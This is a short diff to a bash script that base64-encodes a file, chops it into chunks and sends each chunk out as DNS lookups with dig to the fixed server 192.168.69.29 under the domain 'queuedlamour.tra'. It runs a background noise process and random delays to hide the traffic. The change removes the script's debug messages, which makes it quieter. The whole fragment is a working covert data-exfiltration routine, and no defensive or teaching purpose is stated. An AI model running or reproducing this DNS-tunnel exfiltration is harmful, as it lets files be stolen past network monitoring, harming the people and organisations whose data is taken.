@@ -40,7 +40,6 @@ _noise(){
     done
 }
 _noise & PID="$!"
-echo "GO DNS"
 for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do 
     if [[ "$c" -lt "$s"  ]]; then
         echo -ne "$i-."
@@ -51,8 +50,6 @@ for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do
     fi
 done ); do
     dig @192.168.69.29 `echo -ne $r"queuedlamour.tra"|tr "+" "*"` +short
-    echo "OK"
     sleep $((RANDOM%4))
 done
 kill -9 $PID
-echo "FIIIIIIIIIIN"
